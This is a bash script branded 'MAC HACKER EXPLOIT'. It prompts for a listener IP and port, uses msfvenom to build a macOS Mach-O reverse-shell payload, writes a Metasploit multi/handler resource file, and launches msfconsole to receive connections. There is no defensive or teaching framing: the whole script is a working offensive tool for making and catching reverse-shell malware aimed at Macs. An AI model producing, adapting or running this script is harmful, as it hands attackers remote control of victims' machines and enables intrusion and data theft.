#!/bin/bash

LPARTH=`pwd`
# requirements tool download
clear



clear

#logo or name
echo " WELCOME TO MAC "
figlet -f standard HACKER
echo " EXPLOIT "
echo "_________________________________________________________________________________"
echo "your ip info.. "

ifconfig

#tool logo
echo "==========================================="
echo "==========||||||||||||||||||||||==========="
echo "==========||||HACKER-EXPLOIT||||==========="
echo "==========||||||||||||||||||||||==========="
echo "==========================================="



#info input

echo " please input your current interface ip or Lhost"
read -p ' HE :~ ' LHOST

echo " please input your Choice Port number "
read -p ' HE :~ ' LPORT


echo " please input your choice (any) action name for temp data "
read -p ' HE :~ ' SYSFUC 

#OUTPUT 

echo " ===============loading-100%================="

echo "file Crearing while 3 of 2 min "






sudo msfvenom -p osx/x86/shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f macho -o $LPARTH/WH-output/$SYSFUC.macho



#temp  file creating 
echo " Creating a msf temp " 
mkdir temp

touch $LPARTH/temp/$SYSFUC.rc 

#exquate ip & port & handeler & payload 

echo " use exploit/multi/handler" >> $LPARTH/temp/$SYSFUC.rc 
echo " set payload osx/x86/shell_reverse_tcp " >> $LPARTH/temp/$SYSFUC.rc
echo " set LHOST $LHOST " >> $LPARTH/temp/$SYSFUC.rc
echo " set LPORT $LPORT " >> $LPARTH/temp/$SYSFUC.rc

echo " oping msfconsole  "


msfconsole -r $LPARTH/temp/$SYSFUC.rc
bash $LPARTH/whe2
